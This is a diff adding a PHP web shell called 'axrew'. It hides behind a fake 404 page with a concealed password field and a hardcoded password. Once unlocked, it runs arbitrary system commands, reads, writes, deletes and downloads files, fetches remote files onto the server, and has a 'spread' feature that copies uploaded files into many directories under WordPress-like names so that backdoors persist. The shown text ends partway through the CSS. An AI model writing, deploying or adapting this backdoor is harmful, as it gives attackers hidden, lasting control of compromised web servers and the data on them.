@@ -1,0 +1,1068 @@
+<?php
+header("X-XSS-Protection: 0");
+ob_start();
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', FALSE);
+
+// ═══════════════════════════════════════════════
+//  LOGIN CONFIG — ganti password di sini
+// ═══════════════════════════════════════════════
+define('SHELL_PASS', 'axrew2025');   // <- ganti password
+define('SHELL_SESS', 'axrew_auth');  // session key
+
+session_start();
+
+// ── Handle login POST ──
+if(isset($_POST['__login'])){
+    if($_POST['__login'] === SHELL_PASS){
+        $_SESSION[SHELL_SESS] = true;
+        header('Location: '.$_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        // Wrong password – tetap tampilkan 403
+        $loginError = true;
+    }
+}
+
+// ── Handle logout ──
+if(isset($_GET['__logout'])){
+    session_destroy();
+    header('Location: '.$_SERVER['PHP_SELF']);
+    exit;
+}
+
+// ── Gate: belum login → tampilkan fake 403 ──
+if(empty($_SESSION[SHELL_SESS])){
+    http_response_code(404);
+    $srv  = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Apache/2.4.29 (Ubuntu)';
+    $host = isset($_SERVER['HTTP_HOST'])       ? $_SERVER['HTTP_HOST']       : 'localhost';
+    $port = isset($_SERVER['SERVER_PORT'])     ? $_SERVER['SERVER_PORT']     : '80';
+?><html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address id="_a"><?=htmlspecialchars($srv)?> Server at <?=htmlspecialchars($host)?> Port <?=htmlspecialchars($port)?></address>
+<form method="POST" action="" style="margin:0;padding:0;">
+<input type="password" name="__login" id="_p" autocomplete="off" style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;">
+</form>
+<script>
+(function(){
+  var f=document.getElementById('_p');
+  var err=<?=isset($loginError)?'true':'false'?>;
+  var a=document.getElementById('_a');
+  if(err){a.style.color='#bbb';setTimeout(function(){a.style.color='';},700);}
+  document.addEventListener('keydown',function(e){
+    if(e.ctrlKey||e.altKey||e.metaKey)return;
+    if(e.key==='Enter'){if(f.value.length>0)f.form.submit();return;}
+    if(e.key==='Backspace'||e.key.length===1){f.focus();}
+  });
+  var cc=0,ct;
+  document.querySelector('h1').addEventListener('click',function(){
+    cc++;clearTimeout(ct);
+    if(cc>=3){cc=0;f.focus();}
+    else ct=setTimeout(function(){cc=0;},500);
+  });
+  a.addEventListener('click',function(){f.focus();});
+})();
+</script>
+</body></html>
+<?php
+    ob_end_flush();
+    exit;
+}
+// ═══════════════════════════════════════════════
+//  SHELL — kode asli di bawah ini
+// ═══════════════════════════════════════════════
+
+function perms($f){if(!file_exists($f))return '----';return substr(decoct(fileperms($f)),-4);}
+function fsize($f){if(!file_exists($f))return '0 B';if(is_dir($f))return 'DIR';$s=filesize($f);if($s>=1073741824)return round($s/1073741824,2).' GB';if($s>=1048576)return round($s/1048576,2).' MB';if($s>=1024)return round($s/1024,1).' KB';return $s.' B';}
+function aj($d){header('Content-Type: application/json');echo json_encode($d);exit();}
+
+$cp=isset($_GET['dir'])?$_GET['dir']:(isset($_SESSION['path'])?$_SESSION['path']:getcwd());
+$rp=realpath($cp);
+if($rp&&is_dir($rp)){$_SESSION['path']=$rp;chdir($rp);}
+else{if(!isset($_SESSION['path']))$_SESSION['path']=getcwd();chdir($_SESSION['path']);}
+
+$SHELL_HOME=realpath(dirname(__FILE__));
+
+function sysinfo(){
+    $i=[];
+    $i['user']       = @get_current_user();
+    $i['uid']        = function_exists('posix_getuid')?posix_getuid():'';
+    $i['hostname']   = @gethostname();
+    $i['ip']         = isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:(isset($_SERVER['LOCAL_ADDR'])?$_SERVER['LOCAL_ADDR']:'N/A');
+    $i['port']       = isset($_SERVER['SERVER_PORT'])?$_SERVER['SERVER_PORT']:'N/A';
+    $i['os']         = PHP_OS;
+    $i['uname']      = @php_uname();
+    $i['php']        = phpversion();
+    $i['server']     = isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'N/A';
+    $i['docroot']    = isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'N/A';
+    $i['script']     = isset($_SERVER['SCRIPT_FILENAME'])?$_SERVER['SCRIPT_FILENAME']:'N/A';
+    $df=@disk_free_space('/');$dt=@disk_total_space('/');
+    $i['disk_free']  = $df!==false?fsize((int)$df):'N/A';
+    $i['disk_total'] = $dt!==false?fsize((int)$dt):'N/A';
+    $i['safe_mode']  = ini_get('safe_mode')?'On':'Off';
+    $i['open_bd']    = ini_get('open_basedir')?ini_get('open_basedir'):'none';
+    $i['disable_fn'] = ini_get('disable_functions')?ini_get('disable_functions'):'none';
+    $i['max_upload'] = ini_get('upload_max_filesize');
+    $i['max_exec']   = ini_get('max_execution_time').'s';
+    return $i;
+}
+
+if(isset($_POST['action'])){
+    $act=$_POST['action'];
+
+    if($act=='chdir'&&isset($_POST['path'])){
+        $np=realpath($_POST['path']);
+        if($np&&is_dir($np)){$_SESSION['path']=$np;chdir($np);aj(['ok'=>1,'path'=>$np]);}
+        else aj(['ok'=>0,'msg'=>'Invalid directory']);
+    }
+
+    if($act=='ls'){
+        $path=$_SESSION['path'];chdir($path);
+        $files=[];$items=@scandir($path);
+        if($items===false)aj(['ok'=>1,'files'=>[],'path'=>$path,'err'=>'Permission denied']);
+        foreach($items as $it){
+            if($it=='.'||$it=='..')continue;
+            $fp=$path.DIRECTORY_SEPARATOR.$it;
+            $files[]=['name'=>$it,'isdir'=>is_dir($fp),'size'=>fsize($fp),'perm'=>perms($fp),
+                'time'=>@filemtime($fp)?date('Y-m-d H:i:s',filemtime($fp)):'-',
+                'w'=>is_writable($fp),'r'=>is_readable($fp)];
+        }
+        aj(['ok'=>1,'files'=>$files,'path'=>$path]);
+    }
+
+    if($act=='upload'&&isset($_FILES['file'])){
+        $t=$_SESSION['path'].DIRECTORY_SEPARATOR.basename($_FILES['file']['name']);
+        if(move_uploaded_file($_FILES['file']['tmp_name'],$t)){@chmod($t,0644);aj(['ok'=>1]);}
+        else aj(['ok'=>0]);
+    }
+
+    if($act=='remote'&&isset($_POST['url'])&&isset($_POST['filename'])){
+        $c=@file_get_contents($_POST['url']);
+        if($c!==false){
+            $t=$_SESSION['path'].DIRECTORY_SEPARATOR.basename($_POST['filename']);
+            if(file_put_contents($t,$c)!==false){@chmod($t,0644);aj(['ok'=>1]);}
+            else aj(['ok'=>0,'msg'=>'Cannot write']);
+        }else aj(['ok'=>0,'msg'=>'Cannot fetch URL']);
+    }
+
+    if($act=='read'&&isset($_POST['file'])){
+        $f=$_POST['file'];
+        if(file_exists($f)&&is_readable($f))aj(['ok'=>1,'content'=>base64_encode(file_get_contents($f))]);
+        else aj(['ok'=>0,'msg'=>'Cannot read']);
+    }
+
+    if($act=='write'&&isset($_POST['file'])&&isset($_POST['content'])){
+        if(file_put_contents($_POST['file'],$_POST['content'])!==false)aj(['ok'=>1]);
+        else aj(['ok'=>0]);
+    }
+
+    if($act=='chmod'&&isset($_POST['file'])&&isset($_POST['perm'])){
+        if(@chmod($_POST['file'],octdec($_POST['perm'])))aj(['ok'=>1]);else aj(['ok'=>0]);
+    }
+
+    if($act=='rename'&&isset($_POST['old'])&&isset($_POST['new'])){
+        if(@rename($_POST['old'],$_POST['new']))aj(['ok'=>1]);else aj(['ok'=>0]);
+    }
+
+    if($act=='mkdir'&&isset($_POST['dir'])){
+        if(@mkdir($_POST['dir'],0755,true))aj(['ok'=>1]);else aj(['ok'=>0]);
+    }
+
+    if($act=='newfile'&&isset($_POST['file'])){
+        if(file_put_contents($_POST['file'],'')!==false){@chmod($_POST['file'],0644);aj(['ok'=>1]);}
+        else aj(['ok'=>0]);
+    }
+
+    if($act=='rrmdir'&&isset($_POST['dir'])){
+        function rrm($d){if(is_dir($d)){$it=@scandir($d);if($it)foreach($it as $i){if($i!='.'&&$i!='..'){$p=$d.DIRECTORY_SEPARATOR.$i;is_dir($p)?rrm($p):@unlink($p);}}return @rmdir($d);}return @unlink($d);}
+        if(rrm($_POST['dir']))aj(['ok'=>1]);else aj(['ok'=>0]);
+    }
+
+    if($act=='rmbulk'&&isset($_POST['files'])){
+        $list=json_decode($_POST['files'],true);$ok=0;$fail=0;
+        function rrm2($d){if(is_dir($d)){$it=@scandir($d);if($it)foreach($it as $i){if($i!='.'&&$i!='..'){$p=$d.DIRECTORY_SEPARATOR.$i;is_dir($p)?rrm2($p):@unlink($p);}}return @rmdir($d);}return @unlink($d);}
+        if(is_array($list))foreach($list as $fp){rrm2($fp)?$ok++:$fail++;}
+        aj(['ok'=>1,'deleted'=>$ok,'failed'=>$fail]);
+    }
+
+    if($act=='copy'&&isset($_POST['files'])&&isset($_POST['dest'])){
+        $list=json_decode($_POST['files'],true);$ok=0;$fail=0;
+        function rcopy($src,$dst){
+            if(is_dir($src)){
+                if(!is_dir($dst)&&!@mkdir($dst,0755,true))return false;
+                $items=@scandir($src);
+                if($items)foreach($items as $i){if($i!='.'&&$i!='..'){if(!rcopy($src.DIRECTORY_SEPARATOR.$i,$dst.DIRECTORY_SEPARATOR.$i))return false;}}
+                return true;
+            }
+            return @copy($src,$dst);
+        }
+        $dest=$_POST['dest'];
+        if(is_array($list))foreach($list as $fp){
+            $name=basename($fp);
+            $target=$dest.DIRECTORY_SEPARATOR.$name;
+            rcopy($fp,$target)?$ok++:$fail++;
+        }
+        aj(['ok'=>1,'copied'=>$ok,'failed'=>$fail]);
+    }
+
+    if($act=='spread'&&isset($_FILES['file'])&&isset($_POST['root'])){
+        $spreadCount = isset($_POST['count']) ? intval($_POST['count']) : 5;
+        if($spreadCount < 1)  $spreadCount = 1;
+        if($spreadCount > 50) $spreadCount = 50;
+
+        function spreadName($ext){
+            $names=['class-wp','wp-config-sample','wp-cron','wp-login','wp-settings','wp-blog-header','wp-load','wp-mail','functions','index','template','theme','plugin','admin','cache','options','user','comment','query','taxonomy','post','page','menu','widget','shortcode','hook','filter','action','script','style','handler','loader','router','helper','utility','common','global','init','setup','install','update','upgrade','activate','register','session','request','response','template-loader','class-walker','class-http','config','settings','bootstrap','autoload','core','base','main','app','module','lib','util','handler','auth','api','data','model','view','controller','service','provider','facade','repository','factory','builder','manager','processor','validator','formatter','encoder','decoder','parser','scanner','monitor','logger','tracker','worker','queue','event','hook','filter','extension','component','block','layout','partial','asset','resource','vendor'];
+            $prefixes=['wp_','wc_','woo_','cf_','acf_','yoast_','seo_','cache_','db_','api_','app_','sys_','lib_','core_','base_',''];
+            $name=$names[array_rand($names)];
+            $pre=$prefixes[array_rand($prefixes)];
+            $suffix=(rand(0,2)===0)?'_'.rand(100,999):( (rand(0,2)===1)?'-'.substr(md5(microtime()),0,6):'' );
+            return $pre.$name.$suffix.'.'.$ext;
+        }
+
+        function getAllLeafDirs($dir, &$leaves, $depth=0){
+            if($depth>15) return;
+            $sub=[];
+            $items=@scandir($dir);
+            if(!$items) return;
+            foreach($items as $it){
+                if($it=='.'||$it=='..')continue;
+                $fp=$dir.DIRECTORY_SEPARATOR.$it;
+                if(is_dir($fp)&&is_readable($fp)&&is_writable($fp)) $sub[]=$fp;
+            }
+            if(empty($sub)){
+                if(is_writable($dir)) $leaves[]=['path'=>$dir,'depth'=>$depth];
+            } else {
+                foreach($sub as $s) getAllLeafDirs($s,$leaves,$depth+1);
+            }
+        }
+
+        function getTopBranches($root){
+            $branches=[];
+            $items=@scandir($root);
+            if(!$items) return $branches;
+            foreach($items as $it){
+                if($it=='.'||$it=='..')continue;
+                $fp=$root.DIRECTORY_SEPARATOR.$it;
+                if(is_dir($fp)&&is_readable($fp)) $branches[$it]=$fp;
+            }
+            return $branches;
+        }
+
+        $root=realpath($_POST['root']);
+        if(!$root||!is_dir($root)) aj(['ok'=>0,'msg'=>'Invalid root directory']);
+
+        $branches = getTopBranches($root);
+        $targets = [];
+
+        if(!empty($branches)){
+            $branchLeaves = [];
+            foreach($branches as $bname => $bpath){
+                $bl = [];
+                getAllLeafDirs($bpath, $bl, 1);
+                if(!empty($bl)){
+                    usort($bl, function($a,$b){ return $b['depth']-$a['depth']; });
+                    $branchLeaves[$bname] = $bl[0]['path'];
+                }
+            }
+            $bkeys = array_keys($branchLeaves);
+            shuffle($bkeys);
+            foreach($bkeys as $bk){
+                if(count($targets)>=$spreadCount) break;
+                $targets[] = $branchLeaves[$bk];
+            }
+        }
+
+        if(count($targets)<$spreadCount){
+            $allLeaves=[];
+            getAllLeafDirs($root,$allLeaves,0);
+            usort($allLeaves,function($a,$b){ return $b['depth']-$a['depth']; });
+            foreach($allLeaves as $lf){
+                if(count($targets)>=$spreadCount) break;
+                if(!in_array($lf['path'],$targets)) $targets[]=$lf['path'];
+            }
+        }
+
+        if(empty($targets) && is_writable($root)) $targets[]=$root;
+        if(empty($targets)) aj(['ok'=>0,'msg'=>'No writable subdirectories found under current path']);
+
+        $origName=basename($_FILES['file']['name']);
+        $ext=strtolower(pathinfo($origName,PATHINFO_EXTENSION));
+        if(!$ext) $ext='php';
+        $tmp=$_FILES['file']['tmp_name'];
+        $proto=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!='off')?'https':'http';
+        $host=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:@gethostname();
+        $docroot=isset($_SERVER['DOCUMENT_ROOT'])?rtrim(str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']),'/'):'';
+
+        $results=[];$ok=0;$fail=0;$srcFile='';
+
+        foreach($targets as $tdir){
+            $fname=spreadName($ext);
+            $dest=$tdir.DIRECTORY_SEPARATOR.$fname;
+            if($ok===0){
+                $res=move_uploaded_file($tmp,$dest);
+                if($res) $srcFile=$dest;
+            } else {
+                $res=$srcFile?@copy($srcFile,$dest):false;
+            }
+            if($res){
+                @chmod($dest,0644); $ok++;
+                $destNorm=str_replace('\\','/',$dest);
+                if($docroot&&strpos($destNorm,$docroot)===0){
+                    $rel=substr($destNorm,strlen($docroot));
+                    if(!$rel||$rel[0]!='/') $rel='/'.$rel;
+                    $url=$proto.'://'.$host.$rel;
+                } else {
+                    $url=$dest;
+                }
+                $results[]=['fname'=>$fname,'url'=>$url,'ok'=>true,'dir'=>$tdir];
+            } else {
+                $fail++;
+                $results[]=['fname'=>$fname,'url'=>'','ok'=>false,'dir'=>$tdir,'err'=>'Write failed (check permissions)'];
+            }
+        }
+        aj(['ok'=>1,'spread'=>$ok,'failed'=>$fail,'results'=>$results,'total_branches'=>count($branches),'count_requested'=>$spreadCount]);
+    }
+
+    if($act=='cmd'&&isset($_POST['cmd'])){
+        $out='';
+        if(function_exists('system')){ob_start();system($_POST['cmd'].' 2>&1');$out=ob_get_clean();}
+        elseif(function_exists('shell_exec')){$out=shell_exec($_POST['cmd'].' 2>&1');}
+        elseif(function_exists('exec')){exec($_POST['cmd'].' 2>&1',$a);$out=implode("\n",$a);}
+        elseif(function_exists('passthru')){ob_start();passthru($_POST['cmd'].' 2>&1');$out=ob_get_clean();}
+        else $out='[No exec function available]';
+        aj(['ok'=>1,'output'=>htmlspecialchars((string)$out)]);
+    }
+}
+
+if(isset($_GET['dl'])){
+    $f=base64_decode($_GET['dl']);
+    if(file_exists($f)&&is_readable($f)){
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($f).'"');
+        header('Content-Length: '.filesize($f));
+        readfile($f);exit();
+    }
+}
+
+$SELF_JS  = addslashes($_SERVER['PHP_SELF']);
+$INIT_PATH= addslashes($_SESSION['path']);
+$HOME_JS  = addslashes($SHELL_HOME);
+$SI       = sysinfo();
+?><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>axrew</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+:root{
+  --bg:#0c0c0e;--s1:#111114;--s2:#16161a;--s3:#1c1c21;--s4:#222228;
+  --bd:#252530;--bd2:#2e2e3a;--a:#7c6aff;--ad:#6355d4;--ah:rgba(124,106,255,.12);
+  --r:#e05252;--y:#c9963a;--b:#5a9fd4;--p:#d4d4d8;--d:#4a4a58;--d2:#72728a;
+  --f:'JetBrains Mono',monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);font-size:12px;overflow:hidden;}
+::-webkit-scrollbar{width:3px;height:3px;}
+::-webkit-scrollbar-track{background:transparent;}
+::-webkit-scrollbar-thumb{background:var(--s4);border-radius:2px;}
+::-webkit-scrollbar-thumb:hover{background:var(--a);}
+.shell{display:flex;flex-direction:column;height:100vh;}
+.hdr{display:flex;flex-direction:column;flex-shrink:0;background:var(--s1);border-bottom:1px solid var(--bd2);}
+.hdr-top{display:flex;align-items:stretch;height:38px;border-bottom:1px solid var(--bd);}
+.logo{display:flex;align-items:center;padding:0 16px;height:100%;background:var(--a);font-size:13px;font-weight:800;letter-spacing:3px;color:#fff;flex-shrink:0;font-style:italic;clip-path:polygon(0 0,100% 0,calc(100% - 8px) 100%,0 100%);padding-right:22px;}
+.hdr-chips{display:flex;align-items:center;}
+.hc{display:flex;align-items:center;gap:4px;padding:0 10px;height:100%;border-right:1px solid var(--bd);}
+.hc:first-child{border-left:1px solid var(--bd);}
+.hc-k{color:var(--d2);font-size:9px;letter-spacing:.4px;text-transform:uppercase;}
+.hc-v{color:var(--p);font-weight:600;font-size:10.5px;}
+.hc-v.acc{color:var(--a);}.hc-v.warn{color:var(--y);}
+.hdr-si{display:flex;align-items:center;overflow-x:auto;overflow-y:hidden;padding:0;height:22px;flex-shrink:0;}
+.hdr-si::-webkit-scrollbar{height:2px;}
+.hdr-si::-webkit-scrollbar-thumb{background:var(--bd2);}
+.hsi{display:flex;align-items:center;gap:4px;padding:0 10px;height:100%;border-right:1px solid var(--bd);white-space:nowrap;flex-shrink:0;}
+.hsi:first-child{border-left:1px solid var(--bd);}
+.hsi-k{color:var(--d);font-size:8.5px;letter-spacing:.3px;text-transform:uppercase;}
+.hsi-v{color:var(--d2);font-size:9.5px;font-weight:500;white-space:nowrap;}
+.hsi-v.ok{color:var(--a);opacity:.9;}.hsi-v.warn{color:var(--y);opacity:.9;}.hsi-v.bad{color:var(--r);}.hsi-v.plain{color:var(--p);opacity:.65;}
+.body{display:flex;flex:1;overflow:hidden;min-height:0;}
+.fp{display:flex;flex-direction:column;flex:1;overflow:hidden;min-width:0;}
+.pbar{display:flex;align-items:center;gap:4px;height:34px;padding:0 9px;background:var(--s2);border-bottom:1px solid var(--bd);flex-shrink:0;}
+.navg{display:flex;gap:2px;flex-shrink:0;}
+.nb{width:25px;height:25px;border-radius:3px;background:transparent;border:1px solid transparent;color:var(--d2);cursor:pointer;font-size:10px;display:flex;align-items:center;justify-content:center;transition:all .12s;}
+.nb:not([disabled]):hover{background:var(--s4);border-color:var(--bd2);color:var(--a);}
+.nb[disabled]{opacity:.2;pointer-events:none;}
+.sep{width:1px;height:16px;background:var(--bd2);flex-shrink:0;margin:0 3px;}
+.pnav{display:flex;flex-wrap:nowrap;align-items:center;flex:1;overflow:hidden;min-width:0;}
+.pseg{color:var(--a);padding:2px 5px;border-radius:3px;cursor:pointer;font-size:10.5px;white-space:nowrap;transition:background .08s,color .08s;max-width:130px;overflow:hidden;text-overflow:ellipsis;}
+.pseg:hover{background:var(--a);color:#fff;}
+.psep{color:var(--bd2);font-size:10px;padding:0 1px;user-select:none;flex-shrink:0;}
+.pbar-right{display:flex;gap:2px;flex-shrink:0;}
+.pb{width:25px;height:25px;border-radius:3px;background:transparent;border:1px solid transparent;color:var(--d2);cursor:pointer;font-size:10px;display:flex;align-items:center;justify-content:center;transition:all .12s;}
+.pb:hover{background:var(--s4);border-color:var(--bd2);color:var(--p);}
+.pb.sel-on{background:rgba(224,82,82,.1);border-color:var(--r);color:var(--r);}
+.bbar{display:none;align-items:center;gap:4px;height:28px;padding:0 9px;background:rgba(37,37,48,.6);border-bottom:1px solid var(--bd2);flex-shrink:0;animation:sld .12s ease;}
+.bbar.on{display:flex;}
+@keyframes sld{from{opacity:0;transform:translateY(-3px);}to{opacity:1;transform:translateY(0);}}
+.bbar-cnt{color:var(--d2);font-size:10px;flex:1;white-space:nowrap;}
+.bbar-cnt b{color:var(--a);}
+.bsm{padding:0 8px;height:20px;border-radius:3px;background:transparent;border:1px solid var(--bd2);color:var(--d2);font-family:var(--f);font-size:10px;cursor:pointer;transition:all .1s;white-space:nowrap;}
+.bsm:hover{border-color:var(--p);color:var(--p);}
+.bcopy{display:none;align-items:center;gap:3px;padding:0 9px;height:20px;border-radius:3px;background:transparent;border:1px solid var(--a);color:var(--a);font-family:var(--f);font-size:10px;font-weight:700;cursor:pointer;transition:all .1s;white-space:nowrap;opacity:.25;pointer-events:none;}
+.bcopy.on{display:flex;opacity:1;pointer-events:all;}
+.bcopy.on:hover{background:var(--a);color:#fff;}
+.bpaste{display:none;align-items:center;gap:3px;padding:0 9px;height:20px;border-radius:3px;background:transparent;border:1px solid var(--b);color:var(--b);font-family:var(--f);font-size:10px;font-weight:700;cursor:pointer;transition:all .1s;white-space:nowrap;}
+.bpaste.on{display:flex;}
+.bpaste.on:hover{background:var(--b);color:#fff;}
+.bdel{display:flex;align-items:center;gap:3px;padding:0 9px;height:20px;border-radius:3px;background:transparent;border:1px solid var(--r);color:var(--r);font-family:var(--f);font-size:10px;font-weight:700;cursor:pointer;transition:all .1s;white-space:nowrap;opacity:.22;pointer-events:none;}
+.bdel.on{opacity:1;pointer-events:all;}
+.bdel.on:hover{background:var(--r);color:#fff;}
+.ftw{flex:1;overflow:auto;min-height:0;}
+.ft{width:100%;border-collapse:collapse;table-layout:fixed;}
+.ft th{position:sticky;top:0;z-index:5;background:var(--s2);color:var(--d);font-size:9.5px;text-transform:uppercase;letter-spacing:.5px;padding:6px 8px;text-align:left;border-bottom:1px solid var(--bd);font-weight:700;user-select:none;white-space:nowrap;}
+.ft th.tc{width:28px;padding:6px 0 6px 10px;}.ft th.ts{width:76px;text-align:right;padding-right:12px;}.ft th.tp{width:48px;}.ft th.tm{width:132px;}.ft th.ta{width:116px;}
+.ft td{padding:5px 8px;border-bottom:1px solid rgba(37,37,48,.8);vertical-align:middle;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.ft td.tc{width:28px;padding:5px 0 5px 10px;}.ft td.ts{text-align:right;padding-right:12px;color:var(--d2);font-size:10.5px;font-variant-numeric:tabular-nums;}.ft td.tp{color:var(--y);font-size:10.5px;opacity:.8;}.ft td.tm{color:var(--d2);font-size:10.5px;}
+.fr{transition:background .07s;}.fr:hover{background:var(--s2);}.fr.sel{background:rgba(224,82,82,.05);}.fr.sel:hover{background:rgba(224,82,82,.09);}
+.fr input[type=checkbox]{appearance:none;-webkit-appearance:none;width:12px;height:12px;border:1px solid var(--bd2);border-radius:2px;background:var(--s3);cursor:pointer;position:relative;display:block;margin:0 auto;transition:all .08s;}
+.fr input[type=checkbox]:checked{background:var(--r);border-color:var(--r);}
+.fr input[type=checkbox]:checked::after{content:'';position:absolute;left:2px;top:0;width:5px;height:7px;border:1.5px solid #fff;border-top:none;border-left:none;transform:rotate(45deg);}
+.fn{display:flex;align-items:center;gap:6px;min-width:0;cursor:pointer;padding:1px 0;}
+.fn .fi{flex-shrink:0;width:14px;text-align:center;font-size:11.5px;}
+.fr.dir .fi{color:#c8c8d0;}.fr.dir .nm{color:#dddde8;font-weight:500;}.fr.file .nm{color:#c8c8d4;}
+.fr.no-read .nm{color:var(--r) !important;opacity:.8;}.fr.no-read .fi{color:var(--r) !important;opacity:.6;}
+.nm{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11.5px;}
+.fag{display:flex;gap:2px;opacity:0;transition:opacity .1s;}.fr:hover .fag{opacity:1;}.fr.sel .fag{opacity:.1;pointer-events:none;}
+.fab{width:23px;height:23px;border-radius:3px;background:transparent;border:1px solid transparent;cursor:pointer;color:var(--d2);font-size:10px;display:flex;align-items:center;justify-content:center;transition:all .09s;}
+.fab:hover{border-color:currentColor;}.fab.fe:hover{color:var(--a);}.fab.fd:hover{color:var(--y);}.fab.fc:hover{color:var(--y);}.fab.fr2:hover{color:var(--b);}.fab.fx:hover{color:var(--r);}
+.empty-r td,.load-r td{text-align:center;padding:32px;color:var(--d2);font-size:11px;}
+.sb{width:280px;flex-shrink:0;border-left:1px solid var(--bd);background:var(--s1);display:flex;flex-direction:column;overflow:hidden;}
+.qa{padding:8px;border-bottom:1px solid var(--bd);display:grid;grid-template-columns:1fr 1fr;gap:4px;flex-shrink:0;}
+.qa-btn{display:flex;align-items:center;justify-content:center;gap:4px;padding:7px 5px;border-radius:4px;background:var(--s2);border:1px solid var(--bd2);color:var(--d2);font-family:var(--f);font-size:10px;font-weight:600;cursor:pointer;transition:all .12s;}
+.qa-btn:hover{background:var(--a);color:#fff;border-color:var(--a);}
+.qa-btn i{font-size:10px;}
+.qa-spread{grid-column:1/-1;border-color:rgba(124,106,255,.35);color:var(--a);background:rgba(124,106,255,.06);}
+.qa-spread:hover{background:var(--a);color:#fff;border-color:var(--a);}
+.term{flex:1;display:flex;flex-direction:column;overflow:hidden;min-height:0;}
+.thdr{display:flex;align-items:center;gap:6px;padding:0 9px;height:30px;background:var(--s2);border-bottom:1px solid var(--bd);flex-shrink:0;}
+.tdots{display:flex;gap:4px;}.tdot{width:8px;height:8px;border-radius:50%;}
+.tdot.r{background:#ff5f56;}.tdot.y{background:#ffbd2e;}.tdot.g{background:#27c93f;}
+.tlbl{color:var(--d2);font-size:10px;flex:1;letter-spacing:.3px;}
+.tbody{flex:1;display:flex;flex-direction:column;gap:5px;padding:6px;overflow:hidden;background:var(--bg);}
+.tout{flex:1;overflow:auto;font-size:10.5px;line-height:1.55;padding:6px;background:#08080b;border-radius:3px;border:1px solid var(--bd);}
+.tline{word-break:break-all;}.tline.cmd{color:var(--r);opacity:.85;}.tline.out{color:var(--a);opacity:.8;}
+.tinw{display:flex;align-items:center;gap:5px;background:var(--s2);border:1px solid var(--bd);border-radius:3px;padding:5px 8px;flex-shrink:0;}
+.tps{color:var(--a);font-weight:700;font-size:11.5px;}
+.tinp{background:transparent;border:none;color:var(--p);font-family:var(--f);font-size:11px;flex:1;outline:none;}
+.tinp::placeholder{color:var(--d);}
+.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:500;justify-content:center;align-items:center;padding:16px;backdrop-filter:blur(6px);}
+.ov.on{display:flex;}
+.mbox{background:var(--s1);border:1px solid var(--bd2);border-top:2px solid var(--a);border-radius:6px;width:100%;max-width:440px;box-shadow:0 10px 50px rgba(0,0,0,.8),0 0 0 1px rgba(124,106,255,.06);animation:mIn .13s ease;}
+.mbox.w{max-width:680px;}
+@keyframes mIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+.mhd{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;border-bottom:1px solid var(--bd);}
+.mttl{color:var(--a);font-weight:700;font-size:11.5px;display:flex;align-items:center;gap:5px;}
+.mx{background:none;border:1px solid transparent;color:var(--d2);font-size:16px;cursor:pointer;padding:1px 6px;border-radius:3px;transition:all .1s;line-height:1.3;}
+.mx:hover{color:var(--r);border-color:rgba(224,82,82,.3);}
+.mbody{padding:12px;}
+.mi{width:100%;padding:7px 10px;margin-bottom:8px;background:var(--s3);border:1px solid var(--bd2);color:var(--p);border-radius:4px;font-family:var(--f);font-size:11px;outline:none;transition:border-color .1s;}
+.mi:focus{border-color:var(--a);}.mi::placeholder{color:var(--d);}
+.mta{width:100%;min-height:210px;resize:vertical;padding:8px 10px;line-height:1.55;margin-bottom:8px;background:var(--s3);border:1px solid var(--bd2);color:var(--p);border-radius:4px;font-family:var(--f);font-size:11px;outline:none;transition:border-color .1s;}
+.mta:focus{border-color:var(--a);}
+.mfoot{display:flex;gap:5px;justify-content:flex-end;padding:0 12px 12px;}
+.btn{display:flex;align-items:center;gap:4px;padding:5px 13px;border:1px solid;border-radius:4px;font-family:var(--f);font-size:11px;font-weight:700;cursor:pointer;transition:all .12s;white-space:nowrap;}
+.bg{border-color:var(--a);color:var(--a);background:transparent;}.bg:hover{background:var(--a);color:#fff;}
+.br{border-color:var(--r);color:var(--r);background:transparent;}.br:hover{background:var(--r);color:#fff;}
+.bfw{width:100%;justify-content:center;}
+.cmsg{color:var(--p);font-size:11px;line-height:1.7;margin-bottom:10px;opacity:.85;}
+/* SPREAD */
+.mbox.sp{max-width:500px;}
+.spread-info{font-size:10px;color:var(--d2);line-height:1.6;padding:8px 10px;margin-bottom:8px;background:var(--bg);border:1px solid var(--bd);border-radius:4px;border-left:2px solid var(--a);}
+.spread-log{margin-top:10px;background:var(--bg);border:1px solid var(--bd2);border-radius:4px;max-height:190px;overflow-y:auto;font-size:10px;}
+.spread-log-hdr{display:flex;align-items:center;justify-content:space-between;padding:6px 10px;border-bottom:1px solid var(--bd);color:var(--d2);font-size:9.5px;letter-spacing:.4px;text-transform:uppercase;font-weight:700;}
+.spread-log-hdr span{color:var(--a);}
+.sl-item{display:flex;flex-direction:column;gap:2px;padding:7px 10px;border-bottom:1px solid rgba(37,37,48,.7);}
+.sl-item:last-child{border-bottom:none;}
+.sl-fname{color:var(--d2);font-size:9px;opacity:.7;}
+.sl-url{color:var(--a);word-break:break-all;cursor:pointer;transition:opacity .1s;font-size:10px;}
+.sl-url:hover{opacity:.7;text-decoration:underline;}
